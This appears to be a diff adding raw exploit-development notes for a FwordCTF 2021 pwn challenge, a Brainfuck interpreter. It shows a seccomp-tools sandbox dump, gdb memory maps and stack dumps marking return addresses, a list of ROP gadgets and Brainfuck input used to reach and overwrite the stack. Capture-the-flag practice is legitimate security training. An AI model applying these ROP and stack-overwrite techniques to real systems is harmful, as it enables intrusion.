@@ -1,0 +1,99 @@
+mito@ubuntu:~/CTF/FwordCTF_2021/Pwn_Peaky_&_the_Brain/ImageFuck$ seccomp-tools dump ./interpreter "++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++.>+++++.+++++.---.++++++++++++++.<----------------------.<++.>+++++++++++++.>--------------------..<<++++++++++++.------------.>-----.>+++++++++++++.-----------------.++++++++.+++++.<<++++++++++++.------------.>>+++++++++.---------------.-------.+++++++++++++++++++.<<.>>----------------.+++++++++++.<<.>>++++++++++.----------.++++++.<<.>>++.----------------------.+++++++++++++.++++++.<<.>>.-----.<<.>>-----------.+++++++++++.<<.>>+++++.-----.-.-----.--.+.++++++++++++.<---.<.........>+++.>--.-----------------.++++++++.+++++.<--------.<.>++++++++++++++++++++++++++.>------.---.<<.>>++++++++++++++.<+++++++++++++.>------.<++++.<.>>+++++++.<+++.+.+++++.-------.<.>>+++.<--.<.>-.>--------.<<.>+.>+++++++.<.>----.+++++++.<<.>+++++++++.-----.--.+.>-----.<<++++++++++++.------------.>------------------------.>-----------.+++++.---.++++++++++++++.<<.+++++++++++++.-------------.>>-----.--.+++++++.<<.>>-----.-----.<<.>>+++++.<+++++++++++++++++.>---------.<++++.<.>>++++.+++++++.<.>----.<<.>>++.<+++.---.<.>>+++.--------.+++.------.<-.<+." aaaaaaaaaaaaa
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
+ 0005: 0x15 0x06 0x00 0x0000000a  if (A == mprotect) goto 0012
+ 0006: 0x15 0x05 0x00 0x00000029  if (A == socket) goto 0012
+ 0007: 0x15 0x04 0x00 0x00000038  if (A == clone) goto 0012
+ 0008: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0012
+ 0009: 0x15 0x02 0x00 0x0000003a  if (A == vfork) goto 0012
+ 0010: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x06 0x00 0x00 0x00000000  return KILL
+mito@ubuntu:~/CTF/FwordCTF_2021/Pwn_Peaky_&_the_Brain/ImageFuck$
+
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/FwordCTF_2021/Pwn_Peaky_&_the_Brain/ImageFuck/interpreter
+0x00401000         0x004a9000         r-xp	/home/mito/CTF/FwordCTF_2021/Pwn_Peaky_&_the_Brain/ImageFuck/interpreter
+0x004a9000         0x004dd000         r--p	/home/mito/CTF/FwordCTF_2021/Pwn_Peaky_&_the_Brain/ImageFuck/interpreter
+0x004de000         0x004e2000         r--p	/home/mito/CTF/FwordCTF_2021/Pwn_Peaky_&_the_Brain/ImageFuck/interpreter
+0x004e2000         0x004e5000         rw-p	/home/mito/CTF/FwordCTF_2021/Pwn_Peaky_&_the_Brain/ImageFuck/interpreter
+0x004e5000         0x00509000         rw-p	[heap]
+0x00007ffff7ffa000 0x00007ffff7ffd000 r--p	[vvar]
+0x00007ffff7ffd000 0x00007ffff7fff000 r-xp	[vdso]
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+gdb-peda$ x/80gx $rbp-0x20
+0x7fffffffdcc0:	0x00007fffffffdc70	0x0000000000411a5c
+0x7fffffffdcd0:	0x00000000004e7ba0	0x0000000000000000
+
+gdb-peda$ x/80gx 0x7fffffffdc00
+0x7fffffffdc00:	0x0000000000000008	0x624625b7f832a100
+0x7fffffffdc10:	0x00000000004e90d0	0x00000000004e7ba0
+0x7fffffffdc20:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc30:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc40:	0x0000000000000000	0x0000000000403689
+0x7fffffffdc50:	0x0000000000000000	0x0000000000401ebf
+0x7fffffffdc60:	0x00000000004e90d0	0x00007fffffffe1c4
+0x7fffffffdc70:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc80:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc90:	0x0000000000000000	0x0000000000000000
+0x7fffffffdca0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdcb0:	0x000000290000000a	0x3e00003900000038
+0x7fffffffdcc0:	0x00007fffffffdc70	0x0000000000411a5c
+                       ↑Pointer
+0x7fffffffdcd0:	0x00000000004e7ba0	0x0000000000000000
+0x7fffffffdce0:	0x00007fffffffdd00	0x000000000040203b  ←return address
+0x7fffffffdcf0:	0x00007fffffffde38	0x00000003004e2018
+0x7fffffffdd00:	0x00000000004119e0	0x0000000000411210
+
+0x7fffffffdde0:	0x00000000004e90c0	0x00007fffffffe32a
+0x7fffffffddf0:	0x0000000000000000	0x0000000000000000
+0x7fffffffde00:	0x0000000000000000	0x0000000000000000
+0x7fffffffde10:	0x0000000000000000	0x0000000000000000
+0x7fffffffde20:	0x0000000000000000	0x0000000000000000
+0x7fffffffde30:	0x000000290000000a	0x2e00003900000038
+0x7fffffffde40:	0x00007fffffffde68	0x0000000000411a5c
+0x7fffffffde50:	0x00000000004e7b90	0x000000000000007a
+0x7fffffffde60:	0x00007fffffffde80	0x000000000040203b  ←return address
+0x7fffffffde70:	0x00007fffffffdfb8	0x00000003004e2018
+0x7fffffffde80:	0x00000000004119e0	0x0000000000411210
+0x7fffffffde90:	0x0000000000000000	0x0000000300000000
+0x7fffffffdea0:	0x00007fffffffdfb8	0x0000000000401fec
+0x7fffffffdeb0:	0x0000000000000000	0x0000000600000000
+0x7fffffffdec0:	0x000000030000005e	0x0000000000000050
+0x7fffffffded0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdee0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdef0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdf00:	0x0000000000400530	0x004c0cfe5268ed90
+0x7fffffffdf10:	0x0000000000411a80	0x0000000000000000
+0x7fffffffdf20:	0x00000000004e2018	0x0000000000000000
+0x7fffffffdf30:	0xffb3f383dc88ed90	0x004c0cfe422aed90
+
+=> 0x402041 <main+85>:	ret    
+   0x402042:	nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x40204c:	nop    DWORD PTR [rax+0x0]
+   0x402050 <_rc_filter.part.0>:	mov    eax,edi
+   0x402052 <_rc_filter.part.0+2>:	cmp    edi,0xffffffff
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdf08 --> 0x411210 (<__libc_start_main+1168>:	mov    edi,eax)
+0008| 0x7fffffffdf10 --> 0x0 
+
+0x000000000045cd07: pop rax; ret;
+0x00000000004018da: pop rdi; ret;
+0x0000000000402a38: pop rsi; ret;
+0x00000000004017df: pop rdx; ret;
+0x0000000000426194: syscall; ret;
+0x0000000000402487: pop rsp; ret;
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>,
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>,
+
+>,>,>,>,>,>,>,>,>,------------------------------------------------
+>,>,>,>,>,>,>,>,>,------------------------------------------------
